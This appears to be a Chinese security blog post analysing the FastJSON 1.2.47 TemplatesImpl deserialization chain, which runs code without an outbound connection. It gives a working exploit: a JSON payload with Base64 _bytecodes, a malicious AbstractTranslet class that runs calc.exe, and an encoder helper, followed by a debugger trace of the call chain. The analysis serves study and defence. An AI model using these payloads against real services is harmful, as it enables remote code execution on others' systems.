---
title: 代码审计 | FastJSON 1.2.47 不出网利用 —— TemplatesImpl 链分析
categories:
  - [代码审计, fastjson]
tags:
  - FastJSON
  - Java反序列化
  - RCE
  - TemplatesImpl
cover: >-
  https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image2.png
abbrlink: f70df821
date: 2026-03-27 00:00:00
---

## 目录

- [前言](#前言)
- [两条链的区别](#两条链的区别)
- [TemplatesImpl 链概览](#templatesimpl-链概览)
- [利用前提](#利用前提)
- [利用步骤](#利用步骤)
- [Payload 构造](#payload-构造)
- [调试跟链](#调试跟链)
- [完整调用链总结](#完整调用链总结)
- [局限性](#局限性)

---

## 前言

上一篇分析了 FastJSON 1.2.24 的 JdbcRowSetImpl 出网 RCE 链，以及 1.2.25 ~ 1.2.43 的 autoType 绕过演进。这篇来看 1.2.47 的不出网利用方式——**TemplatesImpl 链**。

关于 1.2.47 缓存绕过的原理（step1/step2 两步 Payload 的来龙去脉），已经在上一篇里详细分析过了，这里直接用。

---

## 两条链的区别

- **JdbcRowSetImpl** 是 setter 型利用链
- **TemplatesImpl** 是 getter 型利用链

| | JdbcRowSetImpl | TemplatesImpl |
|---|---|---|
| 是否出网 | ✅ 需要出网（JNDI 连接 RMI/LDAP）| ❌ 不需要出网 |

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image1.png)

TemplatesImpl 链利用缓存机制，无需开启：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

---

## TemplatesImpl 链概览

整体思路就是：把恶意 Java 字节码直接 Base64 编码塞进 JSON 里，让 FastJSON 在本地加载并实例化，不需要任何外部连接。

利用流程：

```
1. [编写] 继承 AbstractTranslet 的恶意类
2. [编译] javac Exploit.java
3. [编码] Base64.encode(Exploit.class) -> String
4. [填入] 放入 Payload 的 _bytecodes 字段
```

---

## 利用前提

这条链有一个比较苛刻的条件：**必须开启 `Feature.SupportNonPublicField`**。

原因是 `_bytecodes` 是 `private` 字段，FastJSON 默认只处理 `public` 字段，开启这个 Feature 才能反序列化私有字段。

```java
JSONObject data = JSON.parseObject(payload, Feature.SupportNonPublicField);
```

不过一般情况这个是不会开启的，谁有事没事把私有字段也开放出来……所以这条链的实战利用条件比较苛刻，但还是有必要学习一下，后面的 CC 链、CB 链里都有 TemplatesImpl 的影子。

---

## 利用步骤

### Payload 构造

```java
String payload = "{" +
    "\"step1\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"}," +
    "\"step2\":{" +
    "\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
    "\"_bytecodes\":[\"yv66vgAAADQA...\"]," +  // 这里放你恶意类的 Base64 字节码
    "\"_name\":\"Exploit\"," +
    "\"_tfactory\":{}," +
    "\"_outputProperties\":{}" +
    "}" +
    "}";

// 关键点：不出网打 TemplatesImpl 必须开启 SupportNonPublicField
// 因为 _bytecodes 等字段是私有的 (private)
JSONObject data = JSON.parseObject(payload, Feature.SupportNonPublicField);
System.out.println(data);
```

#### 关键字段说明

| 字段 | 是否必须 | 原因 |
|---|---|---|
| `_bytecodes` | ✅ 必须 | 恶意字节码载体 |
| `_name` | ✅ 必须 | 为 null 会提前 return |
| `_tfactory` | ⚠️ 建议写 | 低版本 JDK 需要，写 `{}` 兼容 |
| `_outputProperties` | ✅ 必须 | 触发 getter，启动整条链 |

> `_tfactory` 这个字段比较特殊：低版本 JDK 里真的会用到它来构造 ClassLoader，不传会 NPE；高版本 JDK 已经把这行改掉了，传不传都无所谓。保险起见写个 `{}` 兼容两边。

---

### 恶意类编写

`src/main/java/org/example/Exploit.java`

```java
public class Exploit extends AbstractTranslet {
    public Exploit() {
        try {
            // 不出网环境：弹出计算器验证（Windows）
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}

    @Override
    public void transform(DOM document,
            com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator,
            SerializationHandler handler) throws TransletException {}
}
```

> 这里恶意代码放在构造方法里也可以，放在 `static {}` 静态块里也可以。`newInstance()` 的执行顺序是先 static 块再构造方法，两种写法都能触发。

---

### 字节码转 Base64

`src/main/java/org/example/BytecodeGenerator.java`

```java
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class BytecodeGenerator {
    public static void main(String[] args) throws Exception {
        // 1. 手动或通过 javac 编译 Exploit.java 得到 Exploit.class
        // 2. 读取字节码文件
        // 指向文件的实际物理路径
        byte[] classBytes = Files.readAllBytes(
            Paths.get("target/classes/org/example/Exploit.class"));

        // 3. 转换为 Base64
        String base64Code = Base64.getEncoder().encodeToString(classBytes);

        // 4. 打印结果（这就是你要填入 Payload 的内容）
        System.out.println("----- Copy the following string to _bytecodes -----");
        System.out.println(base64Code);
    }
}
```

**效果：**

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image2.png)

---

## 调试跟链

前面步骤差不多，直接跳到读取检测完 step2 的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 值这里开始。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image3.png)

FastJSON 检测到 `_outputProperties:{}` 之后，根据 FastJSON 的特性会去执行对应的 getter 方法，写成 `outputProperties:{}` 也可以，FastJSON 会自动处理下划线的问题。

---

### 触发入口：getOutputProperties

找到了 `getOutputProperties` 函数，进入：

```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    } catch (TransformerConfigurationException e) {
        return null;
    }
}
```

调用了 `newTransformer().getOutputProperties()`，跟进去。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image4.png)

进入 `new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory)`

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image5.png)

---

### 进入 getTransletInstance

#### _name 检查

进来这里看到了：

```java
if (_name == null) return null; // ← _name 不能为 null！
```

**`_name` 必须不为 null**，第一行就判断，`_name` 是 null 直接 return，后面什么都不执行。所以前面 Payload 里的 `_name` 值必须有值，什么字符串都可以，随便写。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image6.png)

---

### 进入 defineTransletClasses

紧接着下面的 if，进入 `defineTransletClasses()`。

在这里可以看到要开始加载 `_bytecodes` 了，但显然是有值的，不会停在这里。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image7.png)

---

### _tfactory 的问题

就在下面看到了参数 `_tfactory` 被使用，如果 Payload 里面没有赋值 `_tfactory` 的话就会报错（NPE）。

```java
TransletClassLoader loader = new TransletClassLoader(
    ObjectFactory.findClassLoader(),
    _tfactory.getExternalExtensionsMap()); // ← _tfactory 在这里被用到
```

这就是为什么 Payload 里要写 `"_tfactory":{}`，给它一个空对象兜底。

> 注意：这个调用只在低版本 JDK 里存在，高版本 JDK 已经去掉了这行，直接构造 ClassLoader 不再依赖 `_tfactory`。所以这里的行为跟你的 JDK 版本有关。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image8.png)

---

### 加载 _bytecodes

接着来到这里，这里就是加载 `_bytecodes` 的地方，把读取的内容给了 `superClass`。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image9.png)

---

### 父类检测：为什么必须继承 AbstractTranslet

下面还有一段对父类 `ABSTRACT_TRANSLET` 的检测：

```java
if (_class[i].getSuperclass().getName().equals(ABSTRACT_TRANSLET)) {
    _transletIndex = i; // ← 只有继承了才会赋值
}
```

可以看到，如果检测到继承了 `AbstractTranslet`，`_transletIndex` 就不会是默认的 `-1`，也就不会执行下面的：

```java
if (_transletIndex < 0) {
    // 直接抛出错误
}
```

所以构造恶意类的时候**必须继承父类 `AbstractTranslet`**，不是"规范要求"，是"不继承就直接报错"。

> 另外 `AbstractTranslet` 有两个抽象方法必须实现，否则编译就过不了，在恶意类里空实现一下就行，不需要写任何逻辑。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image10.png)

---

### newInstance() 触发 RCE

退出来后执行了 `.newInstance()`，计算器就弹出来了——实例化触发，构造方法里的 `exec` 执行。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E4%B8%8D%E5%87%BA%E7%BD%9147TemplatesImpl%20%E9%93%BE_image11.png)

---

## 完整调用链总结

```
JSON.parseObject(payload, Feature.SupportNonPublicField)
  → getOutputProperties()          ← FastJSON 触发 getter
    → newTransformer()
      → getTransletInstance()
          → _name == null ?  return  ← 所以 _name 必须有值
          → defineTransletClasses()
              → _tfactory.getExternalExtensionsMap()  ← 低版本 JDK 需要 _tfactory
              → loader.defineClass(_bytecodes[i])     ← 字节码加载进 JVM
              → 检查父类是否为 AbstractTranslet       ← 必须继承
          → _class[_transletIndex].newInstance()      ← 💥 RCE
```

---

## 局限性

`SupportNonPublicField` 这个条件在实际目标中几乎不会出现
